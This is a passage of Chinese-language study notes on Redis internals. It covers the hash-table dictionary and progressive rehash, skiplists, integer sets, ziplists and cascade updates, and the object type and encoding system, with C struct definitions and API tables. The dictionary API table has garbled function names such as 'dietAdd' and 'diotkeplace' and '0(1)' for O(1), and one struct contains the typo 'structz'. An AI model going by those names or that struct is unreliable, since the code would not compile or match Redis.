 // 复制值的函数    void *(*valDup)(void *privdata, const void *obj);    // 对比键的函数    int (*keyCompare)(void *privdata, const void *key1, const void *key2);    // 销毁键的函数    void (*keyDestructor)(void *privdata, void *key);    // 销毁值的函数    void (*valDestructor)(void *privdata, void *obj);&#125; dictType;\n\n\n哈希算法当要将一个新的键值对添加到字典里面时，程序需要先根据键值对的键计算出哈希值和索引值，然后再根据索引值，将包含新键值对的哈希表节点放到哈希表数组的指定索引上面。\nRedis计算哈希值和索引值的方法如下：\n使用字典设置的哈希函数，计算键 key 的哈希值hash = dict-&gt;type-&gt;hashFunction(key);\n使用哈希表的 sizemask 属性和哈希值，计算出索引值\n根据情况不同，ht[x]可以是ht[0]或者ht[1]index = hash &amp; dict-&gt;ht[x].sizemask;\n当字典被用作数据库的底层实现，或者哈希键的底层实现时，Redis使用MurmurHash2算法来计算键的哈希值。MurmurHash Wiki\n解决键冲突当有两个或以上数量的键被分配到了哈希表数组的同一个索引上面时，我们称这些键发生了冲突（collision）。Redis的哈希表使用链地址法（separate chaining）来解决键冲突，每个哈希表节点都有一个next指针，多个哈希表节点可以用next指针构成一个单向链表，被分配到同一个索引上的多个节点可以用这个单向链表连接起来，这就解决了键冲突的问题。因为dictEntry节点组成的链表没有指向链表表尾的指针，所以为了速度考虑，程序总是将新节点添加到链表的表头位置（复杂度为O（1）），排在其他已有节点的前面。\n\nRehash随着操作的不断执行，哈希表保存的键值对会逐渐地增多或者减少，为了让哈希表的负载因子（load factor）维持在一个合理的范围之内，当哈希表保存的键值对数量太多或者太少时，程序需要对哈希表的大小进行相应的扩展或者收缩。扩展和收缩哈希表的工作可以通过执行rehash（重新散列）操作来完成，Redis对字典的哈希表执行rehash的步骤如下：\n\n为字典的ht[1]哈希表分配空间，这个哈希表的空间大小取决于要执行的操作，以及ht[0]当前包含的键值对数量（也即是ht[0].used属性的值）：\n如果执行的是扩展操作，那么ht[1]的大小为第一个大于等于ht[0].used*2的2^n（2的n次方幂），即两倍。\n如果执行的是收缩操作，那么ht[1]的大小为第一个大于等于ht[0].used的2^n。即元素数量的最小倍数。\n\n\n将保存在ht[0]中的所有键值对rehash到ht[1]上面：rehash指的是重新计算键的哈希值和索引值，然后将键值对放置到ht[1]哈希表的指定位置上。\n当ht[0]包含的所有键值对都迁移到了ht[1]之后（ht[0]变为空表），释放ht[0]，将ht[1]设置为ht[0]，并在ht[1]新创建一个空白哈希表，为下一次rehash做准备。\n\n当以下条件中的任意一个被满足时，程序会自动开始对哈希表执行扩展操作：\n\n服务器目前没有在执行BGSAVE命令或者BGREWRITEAOF命令，并且哈希表的负载因子大于等于1。\n服务器目前正在执行BGSAVE命令或者BGREWRITEAOF命令，并且哈希表的负载因子大于等于5。\n\n当哈希表的负载因子小于0.1（即小于当前大小十倍）时，程序自动开始对哈希表执行收缩操作。\n其中哈希表的负载因子可以通过下面的公式算出：负载因子 &#x3D; 哈希表已保存节点数量 &#x2F; 哈希表大小load_factor &#x3D; ht[0].used &#x2F; ht[0].size\n根据BGSAVE命令或BGREWRITEAOF命令是否正在执行，服务器执行扩展操作所需的负载因子并不相同。这是因为在执行BGSAVE命令或BGREWRITEAOF命令的过程中，Redis需要创建当前服务器进程的子进程，而大多数操作系统都采用写时复制（copy-on-write）技术来优化子进程的使用效率。所以在子进程存在期间，服务器会提高执行扩展操作所需的负载因子，从而尽可能地避免在子进程存在期间进行哈希表扩展操作，这可以避免不必要的内存写入操作，最大限度地节约内存。\n\nBGSAVE 命令用于在后台异步地执行数据快照（snapshot）保存操作，即创建 Redis 数据的 RDB 文件。执行这个命令时，Redis 会生成一个 RDB 文件，并将当前数据库中的所有数据保存到这个文件中。BGREWRITEAOF 命令用于在后台异步地重写 AOF（Append Only File）日志文件。AOF 是 Redis 提供的另一种持久化方式，通过记录每一个写命令来实现数据的持久化。写时复制（copy-on-write）是指当一个进程创建一个子进程时，子进程会共享父进程的内存页面，而不是立即拷贝整个内存数据。这种共享是“只读”的，直到某一方（父进程或子进程）试图修改共享的数据时，系统才会真正复制该内存页面。这种方式避免了在创建子进程时立即拷贝大量内存数据的开销。\n\n渐进式rehash扩展或收缩哈希表需要将ht[0]里面的所有键值对rehash到ht[1]里面，但是，这个rehash动作并不是一次性、集中式地完成的，而是分多次、渐进式地完成的。\n这样做的原因在于，如果ht[0]里只保存着四个键值对，那么服务器可以在瞬间就将这些键值对全部rehash到ht[1]；但是，如果哈希表里保存的键值对数量不是四个，而是四百万、四千万甚至四亿个键值对，那么要一次性将这些键值对全部rehash到ht[1]的话，庞大的计算量可能会导致服务器在一段时间内停止服务。因此，为了避免rehash对服务器性能造成影响，服务器不是一次性将ht[0]里面的所有键值对全部rehash到ht[1]，而是分多次、渐进式地将ht[0]里面的键值对慢慢地rehash到ht[1]。\n哈希表渐进式rehash的详细步骤：\n\n为ht[1]分配空间，让字典同时持有ht[0]和ht[1]两个哈希表。\n在字典中维持一个索引计数器变量rehashidx，并将它的值设置为0，表示rehash工作正式开始。\n在rehash进行期间，每次对字典执行添加、删除、查找或者更新操作时，程序除了执行指定的操作以外，还会顺带将ht[0]哈希表在rehashidx索引上的所有键值对rehash到ht[1]，当rehash工作完成之后，程序将rehashidx属性的值增一。\n随着字典操作的不断执行，最终在某个时间点上，ht[0]的所有键值对都会被rehash至ht[1]，这时程序将rehashidx属性的值设为-1，表示rehash操作已完成。\n\n渐进式rehash的好处在于它采取分而治之的方式，将rehash键值对所需的计算工作均摊到对字典的每个添加、删除、查找和更新操作上，从而避免了集中式rehash而带来的庞大计算量。\n渐进式rehash执行期间的哈希表操作因为在进行渐进式rehash的过程中，字典会同时使用ht[0]和ht[1]两个哈希表，所以在渐进式rehash进行期间，字典的删除（delete）、查找（find）、更新（update）等操作会在两个哈希表上进行。例如，要在字典里面查找一个键的话，程序会先在ht[0]里面进行查找，如果没找到的话，就会继续到ht[1]里面进行查找，诸如此类。\n另外，在渐进式rehash执行期间，新添加到字典的键值对一律会被保存到ht[1]里面，而ht[0]则不再进行任何添加操作，这一措施保证了ht[0]包含的键值对数量会只减不增，并随着rehash操作的执行而最终变成空表。\n字典API\n\n\n函 数\n作用\n时间复杂度\n\n\n\ndiotcreate\n创建一个新的字典\n0(1)\n\n\ndietAdd\n将给定的键值对添加到字典里面\n0(1)\n\n\ndiotkeplace\n将给定的健值对添加到字典里面，如果键已经 存在于字典，那么用新值取代原有的值\n0(1)\n\n\ndictretchvalue\n这回给定键的值\n0(1)\n\n\ndiotCetRandomKey\n从字典中随机返回个键值对\n0(1)\n\n\n第五章 - 跳跃表跳跃表（skiplist）是一种有序数据结构，它通过在每个节点中维持多个指向其他节点的指针，从而达到快速访问节点的目的。跳跃表支持平均O（logN）、最坏O（N）复杂度的节点查找，还可以通过顺序性操作来批量处理节点。在大部分情况下，跳跃表的效率可以和平衡树相媲美，并且因为跳跃表的实现比平衡树要来得更为简单，所以有不少程序都使用跳跃表来代替平衡树。Redis使用跳跃表作为有序集合键的底层实现之一，如果一个有序集合包含的元素数量比较多，又或者有序集合中元素的成员（member）是比较长的字符串时，Redis就会使用跳跃表来作为有序集合键的底层实现。\n和链表、字典等数据结构被广泛地应用在Redis内部不同，Redis只在两个地方用到了跳跃表，一个是实现有序集合键，另一个是在集群节点中用作内部数据结构，除此之外，跳跃表在Redis里面没有其他用途。\n跳跃表的实现Redis的跳跃表由redis.h&#x2F;zskiplistNode和redis.h&#x2F;zskiplist两个结构定义，其中zskiplistNode结构用于表示跳跃表节点，而zskiplist结构则用于保存跳跃表节点的相关信息，比如节点的数量，以及指向表头节点和表尾节点的指针等等。\n\n上图一个跳跃表示例，位于图片最左边的是 zskiplist 结构，该结构包含以下属性：\n\nheader：指向跳跃表的表头节点。\ntail：指向跳跃表的表尾节点。\nlevel：记录目前跳跃表内，层数最大的那个节点的层数（表头节点的层数不计算在内）。\nlength：记录跳跃表的长度，也即是，跳跃表目前包含节点的数量（表头节点不计算在内）。\n\n位于zskiplist结构右方的是四个zskiplistNode结构，该结构包含以下属性：\n\n层（level）：节点中用L1、L2、L3等字样标记节点的各个层，L1代表第一层，L2代表第二层，以此类推。每个层都带有两个属性：前进指针和跨度。前进指针用于访问位于表尾方向的其他节点，而跨度则记录了前进指针所指向节点和当前节点的距离。在上面的图片中，连线上带有数字的箭头就代表前进指针，而那个数字就是跨度。当程序从表头向表尾进行遍历时，访问会沿着层的前进指针进行。\n后退（backward）指针：节点中用BW字样标记节点的后退指针，它指向位于当前节点的前一个节点。后退指针在程序从表尾向表头遍历时使用。\n分值（score）：各个节点中的1.0、2.0和3.0是节点所保存的分值。在跳跃表中，节点按各自所保存的分值从小到大排列。\n成员对象（obj）：各个节点中的o1、o2和o3是节点所保存的成员对象。\n\n注意表头节点和其他节点的构造是一样的：表头节点也有后退指针、分值和成员对象，不过表头节点的这些属性都不会被用到，所以图中省略了这些部分，只显示了表头节点的各个层。\n跳跃表节点跳跃表节点的实现由redis.h&#x2F;zskiplistNode结构定义：\ntypedef struct zskiplistNode &#123;    // 层    struct zskiplistLevel &#123;        // 前进指针        struct zskiplistNode *forward;        // 跨度        unsigned int span;    &#125; level[];    // 后退指针    struct zskiplistNode *backward;    // 分值    double score;    // 成员对象    robj *obj;&#125; zskiplistNode;\n\n层跳跃表节点的level数组可以包含多个元素，每个元素都包含一个指向其他节点的指针，程序可以通过这些层来加快访问其他节点的速度，一般来说，层的数量越多，访问其他节点的速度就越快。每次创建一个新跳跃表节点的时候，程序都根据幂次定律（power law，越大的数出现的概率越小）随机生成一个介于1和32之间的值作为level数组的大小，这个大小就是层的“高度”。\n前进指针每个层都有一个指向表尾方向的前进指针（level[i].forward属性），用于从表头向表尾方向访问节点。\n跨度层的跨度（level[i].span属性）用于记录两个节点之间的距离：\n\n两个节点之间的跨度越大，它们相距得就越远。\n指向NULL的所有前进指针的跨度都为0，因为它们没有连向任何节点。\n\n初看上去，很容易以为跨度和遍历操作有关，但实际上并不是这样，遍历操作只使用前进指针就可以完成了，跨度实际上是用来计算排位（rank）的：在查找某个节点的过程中，将沿途访问过的所有层的跨度累计起来，得到的结果就是目标节点在跳跃表中的排位。当查找某个值时，程序会从最高层开始逐层往下搜索，每一层会利用跨度跳过多个节点，直到找到目标节点或进入下一层。 可以提高查询的效率。\n后退指针节点的后退指针（backward属性）用于从表尾向表头方向访问节点：跟可以一次跳过多个节点的前进指针不同，因为每个节点只有一个后退指针，所以每次只能后退至前一个节点。\n分值和成员节点的分值（score属性）是一个double类型的浮点数，跳跃表中的所有节点都按分值从小到大来排序。节点的成员对象（obj属性）是一个指针，它指向一个字符串对象，而字符串对象则保存着一个SDS值。在同一个跳跃表中，各个节点保存的成员对象必须是唯一的，但是多个节点保存的分值却可以是相同的：分值相同的节点将按照成员对象在字典序中的大小来进行排序，成员对象较小的节点会排在前面（靠近表头的方向），而成员对象较大的节点则会排在后面（靠近表尾的方向）。\n跳跃表仅靠多个跳跃表节点就可以组成一个跳跃表。但通过使用一个zskiplist结构来持有这些节点，程序可以更方便地对整个跳跃表进行处理，比如快速访问跳跃表的表头节点和表尾节点，或者快速地获取跳跃表节点的数量（也即是跳跃表的长度）等信息。\nzskiplist结构的定义如下：\ntypedef struct zskiplist &#123;    // 表头节点和表尾节点    structz skiplistNode *header, *tail;    // 表中节点的数量    unsigned long length;    // 表中层数最大的节点的层数    int level;&#125; zskiplist;\n\nheader和tail指针分别指向跳跃表的表头和表尾节点，通过这两个指针，程序定位表头节点和表尾节点的复杂度为O（1）。通过使用length属性来记录节点的数量，程序可以在O（1）复杂度内返回跳跃表的长度。level属性则用于在O（1）复杂度内获取跳跃表中层高最大的那个节点的层数量，注意表头节点的层高并不计算在内。\n跳跃表API\n\n\n函数\n作用\n时间复杂度\n\n\n\nzslCreate\n创建一个新的跳跃表\nO(1)\n\n\nzslFree\n释放给定的跳跃表及其包含的所有节点\nO(N)，N 为跳跃表的长度\n\n\nzslInsert\n将包含给定成员和分值的新节点添加到跳跃表中\n平均 O(log N)，最坏 O(N)\n\n\nzslDelete\n删除跳跃表中包含给定成员和分值的节点\n平均 O(log N)，最坏 O(N)\n\n\nzslGetRank\n返回包含给定成员和分值的节点在跳跃表中的排名\n平均 O(log N)，最坏 O(N)\n\n\nzslGetElementByRank\n返回跳跃表中指定排名的节点\n平均 O(log N)，最坏 O(N)\n\n\nzslIsInRange\n判断跳跃表中是否存在至少一个节点的分值在给定范围内\nO(1)，只需检查表头和表尾节点即可\n\n\nzslFirstInRange\n返回跳跃表中第一个符合指定分值范围的节点\n平均 O(log N)，最坏 O(N)\n\n\n第六章 - 整数集合整数集合（intset）是集合键的底层实现之一，当一个集合只包含整数值元素，并且这个集合的元素数量不多时，Redis就会使用整数集合作为集合键的底层实现。\n整数集合的实现整数集合（intset）是Redis用于保存整数值的集合抽象数据结构，它可以保存类型为 int16_t、int32_t或者int64_t 的整数值，并且保证集合中不会出现重复元素。每个intset.h&#x2F;intset结构表示一个整数集合：\ntypedef struct intset &#123;    // 编码方式    uint32_t encoding;    // 集合包含的元素数量    uint32_t length;    // 保存元素的数组    int8_t contents[];&#125; intset;\n\ncontents 数组是整数集合的底层实现：整数集合的每个元素都是contents数组的一个数组项（item），各个项在数组中按值的大小从小到大有序地排列，并且数组中不包含任何重复项。length 属性记录了整数集合包含的元素数量，也即是contents数组的长度。\n虽然intset结构将contents属性声明为int8_t类型的数组，但实际上contents数组并不保存任何int8_t类型的值，contents数组的真正类型取决于encoding属性的值：\n\n如果encoding属性的值为INTSET_ENC_INT16，那么contents就是一个int16_t类型的数组，数组里的每个项都是一个int16_t类型的整数值（最小值为-32768，最大值为32767）。\n如果encoding属性的值为INTSET_ENC_INT32，那么contents就是一个int32_t类型的数组，数组里的每个项都是一个int32_t类型的整数值（最小值为-2147483648，最大值为2147483647）。\n如果encoding属性的值为INTSET_ENC_INT64，那么contents就是一个int64_t类型的数组，数组里的每个项都是一个int64_t类型的整数值（最小值为-9223372036854775808，最大值为9223372036854775807）。\n\n\n当向一个底层为int16_t数组的整数集合添加一个int64_t类型的整数值时，整数集合已有的所有元素都会被转换成int64_t类型。即升级规则。\n\n升级规则（Redis 会对整数集合进行自动升级，以支持不同大小的整数类型。）自动升级触发条件：当一个新插入的整数无法在当前整数集合的类型范围内表示时，Redis 会触发升级。全量复制与排序：Redis 会分配新的内存空间，将原来的所有整数复制到新类型的整数集合中。升级后的整数集合会保持有序状态，以便于后续查找操作。升级不可逆：一旦整数集合升级到更大类型，就不会降级。例如，一旦升级到 int64_t 类型，即使删除所有大整数，类型也不会恢复。\n\n升级每当我们要将一个新元素添加到整数集合里面，并且新元素的类型比整数集合现有所有元素的类型都要长时，整数集合需要先进行升级（upgrade），然后才能将新元素添加到整数集合里面。\n升级整数集合并添加新元素共分为三步进行：\n\n根据新元素的类型，扩展整数集合底层数组的空间大小，并为新元素分配空间。\n将底层数组现有的所有元素都转换成与新元素相同的类型，并将类型转换后的元素放置到正确的位上，而且在放置元素的过程中，需要继续维持底层数组的有序性质不变。\n将新元素添加到底层数组里面。\n\n因为每次向整数集合添加新元素都可能会引起升级，而每次升级都需要对底层数组中已有的所有元素进行类型转换，所以向整数集合添加新元素的时间复杂度为O（N）。\n因为引发升级的新元素的长度总是比整数集合现有所有元素的长度都大，所以这个新元素的值要么就大于所有现有元素，要么就小于所有现有元素：\n\n在新元素小于所有现有元素的情况下，新元素会被放置在底层数组的最开头（索引0）；\n在新元素大于所有现有元素的情况下，新元素会被放置在底层数组的最末尾（索引length-1）。\n\n整数集合的升级策略有两个好处，一个是提升整数集合的灵活性，另一个是尽可能地节约内存。\n因为C语言是静态类型语言，为了避免类型错误，我们通常不会将两种不同类型的值放在同一个数据结构里面。但是，因为整数集合可以通过自动升级底层数组来适应新元素，所以我们可以随意地将int16_t、int32_t或者int64_t类型的整数添加到集合中，而不必担心出现类型错误，这种做法非常灵活。同时因为根据具体情况来使用具体的类型，而不是全部使用int64_t，所以可以节约内存。\n降级整数集合不支持降级操作，一旦对数组进行了升级，编码就会一直保持升级后的状态。即使删除所有大整数，类型也不会恢复。\n整数集合API\n\n\n函数\n作用\n时间复杂度\n\n\n\nintsetNew\n创建一个新的整数集合\nO(1)\n\n\nintsetAdd\n将给定元素添加到整数集合中\nO(N)\n\n\nintsetRemove\n从整数集合中移除给定元素\nO(N)\n\n\nintsetFind\n检查给定值是否存在于集合中\nO(log N)，由于数组有序，可通过二分查找实现\n\n\nintsetRandom\n从整数集合中随机返回一个元素\nO(1)\n\n\nintsetGet\n取出底层数组中给定索引上的元素\nO(1)\n\n\nintsetLen\n返回整数集合中包含的元素个数\nO(1)\n\n\nintsetBlobLen\n返回整数集合的内存字节数\nO(1)\n\n\n第七章 - 压缩列表压缩列表（ziplist）是列表键和哈希键的底层实现之一。当一个列表键只包含少量列表项，并且每个列表项要么就是小整数值，要么就是长度比较短的字符串，那么Redis就会使用压缩列表来做列表键的底层实现。\n压缩列表的构成压缩列表是Redis为了节约内存而开发的，是由一系列特殊编码的连续内存块组成的顺序型（sequential）数据结构。一个压缩列表可以包含任意多个节点（entry），每个节点可以保存一个字节数组或者一个整数值。\n压缩列表主要由以下几个部分组成：\n\nHeader（头部）：\n\nzlbytes：4字节，表示整个压缩列表的总字节数，便于在内存中管理。\nzltail：4字节，记录最后一个元素的偏移量，使得可以快速定位尾部元素。\nzllen：2字节，表示压缩列表中包含的元素数量。如果数量大于 65535，zllen 只表示 65535，实际数量需要遍历确定。\n\n\nEntry（节点）：\n\nprevious_entry_length：1-5字节，表示前一个元素的长度，用于双向遍历。如果前一个元素长度小于 254 字节，previous_entry_length 用 1 字节表示；否则，用 5 字节表示。\nencoding：1-5字节，记录当前元素的数据类型和长度，用于解析元素内容。例如，数据可以是字节数组或整数类型。\ncontent：变长，存储元素的实际数据。\n\n\nEnd（结尾标志）：\n\n压缩列表以 1 字节特殊标志 0xFF 结尾，表示压缩列表结束。\n\n\n\n压缩列表节点的构成节点由以下组成：\n\nprevious_entry_length：1-5字节，表示前一个元素的长\nencoding：1-5字节，记录当前元素的数\ncontent：变长，存储元素的实际数据。\n\n每个压缩列表节点可以保存一个字节数组或者一个整数值，其中，字节数组可以是以下三种长度的其中一种：\n\n长度小于等于63（2 6–1）字节的字节数组；\n长度小于等于16383（2 14–1）字节的字节数组；\n长度小于等于4294967295（2 32–1）字节的字节数组；\n\n而整数值则可以是以下六种长度的其中一种：\n\n4位长，介于0至12之间的无符号整数；\n1字节长的有符号整数；\n3字节长的有符号整数；\nint16_t类型整数；\nint32_t类型整数；\nint64_t类型整数。\n\nprevious_entry_length节点的previous_entry_length属性以字节为单位，记录了压缩列表中前一个节点的长度。previous_entry_length属性的长度可以是1字节或者5字节：\n\n如果前一节点的长度小于254字节，那么previous_entry_length属性的长度为1字节：前一节点的长度就保存在这一个字节里面。\n如果前一节点的长度大于等于254字节，那么previous_entry_length属性的长度为5字节：其中属性的第一字节会被设置为0xFE（十进制值254），而之后的四个字节则用于保存前一节点的长度。\n\n因为节点的previous_entry_length属性记录了前一个节点的长度，所以程序可以通过指针运算，根据当前节点的起始地址来计算出前一个节点的起始地址。举个例子，如果我们有一个指向当前节点起始地址的指针c，那么我们只要用指针c减去当前节点previous_entry_length属性的值，就可以得出一个指向前一个节点起始地址的指针p\n\n双向遍历对于正向遍历。因为每个节点的大小不固定，需要计算当前节点的长度，以根据每个节点的实际长度进行跳转。对于整数类型，encoding 直接决定了所占用的字节数（1、2、4 或 8 字节）。对于字节数组类型，encoding 包含了字节数组的长度信息，用于确定 content 部分的大小。对于反向遍历。则是通过previous_entry_length来实现的，它记录了当前节点的前一个节点的长度，从而可以计算出前一个节点的起始地址，从而进行跳转。\n\nencoding节点的encoding属性记录了节点的content属性所保存数据的类型以及长度。\n\n\n\n编码类型\nencoding 值\n编码字节数\n表示的数据类型\n内容字节数\n\n\n\n字符串编码\n00xxxxxx\n1 字节\n字符串，长度 ≤ 63 字节\n6 位表示长度（0-63）\n\n\n\n01xxxxxx xxxxxxxx\n2 字节\n字符串，长度 ≤ 16383 字节\n14 位表示长度（0-16383）\n\n\n\n100xxxxx xxxxxxxx xxxxxxxx xxxxxxxx\n5 字节\n字符串，长度 ≤ 4294967295 字节\n4 字节表示长度（0-4294967295）\n\n\n整数编码\n1111 0000\n1 字节\n4 位有符号整数\n无\n\n\n\n1100 0000\n1 字节\n1 字节有符号整数\n1 字节内容\n\n\n\n1101 0000\n1 字节\n2 字节有符号整数\n2 字节内容\n\n\n\n1110 0000\n1 字节\n4 字节有符号整数\n4 字节内容\n\n\n\n1111 0001\n1 字节\n8 字节有符号整数\n8 字节内容\n\n\ncontent节点的content属性负责保存节点的值，节点值可以是一个字节数组或者整数，值的类型和长度由节点的encoding属性决定。\n连锁更新前面有提到，每个节点的previous_entry_length属性都记录了前一个节点的长度：\n\n如果前一节点的长度小于254字节，那么previous_entry_length属性需要用1字节长的空间来保存这个长度值。\n如果前一节点的长度大于等于254字节，那么previous_entry_length属性需要用5字节长的空间来保存这个长度值。\n\n那么有一种情况在一个压缩列表中，有多个连续的、长度介于250字节到253字节之间的节点e1至eN，因为e1至eN的所有节点的长度都小于254字节，所以记录这些节点的长度只需要1字节长的previous_entry_length属性。如果将一个长度大于等于254字节的新节点new设置为压缩列表的表头节点，那么new将成为e1的前置节点。因为e1的previous_entry_length属性仅长1字节，它没办法保存新节点new的长度，所以程序将对压缩列表执行空间重分配操作，并将e1节点的previous_entry_length属性从原来的1字节长扩展为5字节长。同时，e1原本的长度介于250字节至253字节之间，在为previous_entry_length属性新增四个字节的空间之后，e1的长度就变成了介于254字节至257字节之间，而这种长度使用1字节长的previous_entry_length属性是没办法保存的。所以e2也需要进行重新分配，以此类推。程序需要不断地对压缩列表执行空间重分配操作，直到eN为止。\nRedis将这种在特殊情况下产生的连续多次空间扩展操作称之为“连锁更新”（cascade update）除了添加新节点可能会引发连锁更新之外，删除节点也可能会引发连锁更新。\n因为连锁更新在最坏情况下需要对压缩列表执行N次空间重分配操作，而每次空间重分配的最坏复杂度为O（N），所以连锁更新的最坏复杂度为O（N 2）。要注意的是，尽管连锁更新的复杂度较高，但它真正造成性能问题的几率是很低的：\n\n首先，压缩列表里要恰好有多个连续的、长度介于250字节至253字节之间的节点，连锁更新才有可能被引发，在实际中，这种情况并不多见；\n其次，即使出现连锁更新，但只要被更新的节点数量不多，就不会对性能造成任何影响：比如说，对三五个节点进行连锁更新是绝对不会影响性能的；\n\n因为以上原因，ziplistPush等命令的平均复杂度仅为O（N），在实际中，我们可以放心地使用这些函数，而不必担心连锁更新会影响压缩列表的性能。\n压缩列表API\n\n\n函数\n作用\n算法复杂度\n\n\n\nziplistNew\n创建一个新的压缩列表\nO(1)\n\n\nziplistPush\n将给定值的新节点添加到压缩列表的表头或表尾\n平均 O(N)，最坏 O(N^2)\n\n\nziplistInsert\n在给定节点之后插入包含给定值的新节点\n平均 O(N)，最坏 O(N^2)\n\n\nziplistIndex\n返回压缩列表给定索引处的节点\nO(N)\n\n\nziplistFind\n在压缩列表中查找并返回包含给定值的节点\nO(N)，值检查为 O(M)\n\n\nziplistNext\n返回给定节点的下一个节点\nO(1)\n\n\nziplistPrev\n返回给定节点的前一个节点\nO(1)\n\n\nziplistGet\n获取给定节点存储的值\nO(1)\n\n\nziplistDelete\n从压缩列表中删除给定的节点\n平均 O(N)，最坏 O(N^2)\n\n\nziplistDeleteRange\n删除压缩列表中从给定索引开始的多个连续节点\n平均 O(N)，最坏 O(N^2)\n\n\nziplistBlobLen\n返回压缩列表当前占用的内存字节数\nO(1)\n\n\nziplistLen\n返回压缩列表当前包含的节点数量\n节点数量 ≤ 65535 时为 O(1)，否则为 O(N)\n\n\n其中：\n\nM 是节点值的字节数（如果节点包含字符串值），表示比较过程中所需的检查复杂度。\nN 是压缩列表中节点的总数。\n\n因为ziplistPush、ziplistInsert、ziplistDelete和ziplistDeleteRange四个函数都有可能会引发连锁更新，所以它们的最坏复杂度都是O（N^2）。\n第八章 - 对象前面介绍了Redis用到的所有主要数据结构，比如简单动态字符串（SDS）、双端链表、字典、压缩列表、整数集合等等。Redis并没有直接使用这些数据结构来实现键值对数据库，而是基于这些数据结构创建了一个对象系统，这个系统包含字符串对象、列表对象、哈希对象、集合对象和有序集合对象这五种类型的对象。\n通过这五种不同类型的对象，Redis可以在执行命令之前，根据对象的类型来判断一个对象是否可以执行给定的命令。使用对象的另一个好处是，我们可以针对不同的使用场景，为对象设置多种不同的数据结构实现，从而优化对象在不同场景下的使用效率。\n除此之外，Redis的对象系统还实现了基于引用计数技术的内存回收机制，当程序不再使用某个对象的时候，这个对象所占用的内存就会被自动释放；另外，Redis还通过引用计数技术实现了对象共享机制，这一机制可以在适当的条件下，通过让多个数据库键共享同一个对象来节约内存。最后，Redis的对象带有访问时间记录信息，该信息可以用于计算数据库键的空转时长，在服务器启用了maxmemory功能的情况下，空转时长较大的那些键可能会优先被服务器删除。\n对象的类型与编码Redis使用对象来表示数据库中的键和值，每次当我们在Redis的数据库中新创建一个键值对时，我们至少会创建两个对象，一个对象用作键值对的键（键对象），另一个对象用作键值对的值（值对象）。\nRedis中的每个对象都由一个redisObject结构表示，该结构中和保存数据有关的三个属性分别是type属性、encoding属性和ptr属性：\ntypedef struct redisObject &#123;    // 类型    unsigned type:4;    // 编码    unsigned encoding:4;    // 指向底层实现数据结构的指针    void *ptr;    // ...&#125; robj;\n\n类型对象的type属性记录了对象的类型，这个属性的值可以是下面列出的常量的其中一个。\n\n\n\n类型常量\n对象的名称\n\n\n\nREDIS_STRING\n字符串对象\n\n\nREDIS_LIST\n列表对象\n\n\nREDIS_HASH\n哈希对象\n\n\nREDIS_SET\n集合对象\n\n\nREDIS_ZSET\n有序集合对象\n\n\n对于Redis数据库保存的键值对来说，键总是一个字符串对象，而值则可以是字符串对象、列表对象、哈希对象、集合对象或者有序集合对象的其中一种，因此：\n\n当我们称呼一个数据库键为“字符串键”时，我们指的是“这个数据库键所对应的值为字符串对象”；\n当我们称呼一个键为“列表键”时，我们指的是“这个数据库键所对应的值为列表对象”。\n\nTYPE命令的实现方式也与此类似，当我们对一个数据库键执行TYPE命令时，命令返回的结果为数据库键对应的值对象的类型，而不是键对象的类型。\n不同类型值对象的TYPE命令输出：\n\n\n\n对象\n对象type属性的值\nTYPE命令的输出\n\n\n\n字符串对象\nREDIS_STRING\n“string”\n\n\n列表对象\nREDIS_LIST\n“list”\n\n\n哈希对象\nREDIS_HASH\n“hash”\n\n\n集合刘象\nREDIS_SET\n“set”\n\n\n有序集合对象\nREDIS_ZSET\n“zset”\n\n\n编码和底层实现对象的ptr指针指向对象的底层实现数据结构，而这些数据结构由对象的encoding属性决定。encoding属性记录了对象所使用的编码，也即是说这个对象使用了什么数据结构作为对象的底层实现，这个属性的值可以是下面列出的常量的其中一个。\n\n\n\n数据类型\n编码常量\n编码所对应的底层数据结构\n\n\n\nString\nREDIS_ENCODING_INT\n整型类型的整数\n\n\nString\nREDIS_ENCODING_EMBSTR\nembstr 编码的简单动态字符串\n\n\nString\nREDIS_ENCODING_RAW\n简单动态字符串\n\n\nHash\nREDIS_ENCODING_ZIPLIST\n压缩列表\n\n\nHash\nREDIS_ENCODING_HT\n字典\n\n\nList\nREDIS_ENCODING_LINKEDLIST\n双端链表\n\n\nList\nREDIS_ENCODING_ZIPLIST\n压缩列表\n\n\nSet\nREDIS_ENCODING_INTSET\n整数集合\n\n\nSet\nREDIS_ENCODING_HT\n字典\n\n\nSorted Set\nREDIS_ENCODING_ZIPLIST\n压缩列表\n\n\nSorted Set\nREDIS_ENCODING_SKIPLIST\n跳跃表和字典\n\n\n每种类型的对象都至少使用了两种不同的编码，下面列出了每种类型的对象可以使用的编码。\n\n\n\n类型\n编码常量\n对象描述\n\n\n\nREDIS_STRING\nREDIS_ENCODING_INT\n使用整数值实现的字符串对象\n\n\nREDIS_STRING\nREDIS_ENCODING_EMBSTR\n使用 embstr 编码的简单动态字符串实现的字符串对象\n\n\nREDIS_STRING\nREDIS_ENCODING_RAW\n使用简单动态字符串实现的字符串对象\n\n\nREDIS_LIST\nREDIS_ENCODING_ZIPLIST\n使用压缩列表实现的列表对象\n\n\nREDIS_LIST\nREDIS_ENCODING_LINKEDLIST\n使用双端链表实现的列表对象\n\n\nREDIS_HASH\nREDIS_ENCODING_ZIPLIST\n使用压缩列表实现的哈希对象\n\n\nREDIS_HASH\nREDIS_ENCODING_HT\n使用字典实现的哈希对象\n\n\nREDIS_SET\nREDIS_ENCODING_INTSET\n使用整数集合实现的集合对象\n\n\nREDIS_SET\nREDIS_ENCODING_HT\n使用字典实现的集合对象\n\n\nREDIS_ZSET\nREDIS_ENCODING_ZIPLIST\n使用压缩列表实现的有序集合对象\n\n\nREDIS_ZSET\nREDIS_ENCODING_SKIPLIST\n使用跳跃表和字典实现的有序集合对象\n\n\n使用OBJECT ENCODING命令可以查看一个数据库键的值对象的编码。下面列出了不同编码的对象所对应的OBJECT ENCODING命令输出。\n\n\n\n对象所使用的底层数据结构\n编码常量\nOBJECT ENCODING 命令输出\n\n\n\n整数\nREDIS_ENCODING_INT\n&quot;int&quot;\n\n\nembstr 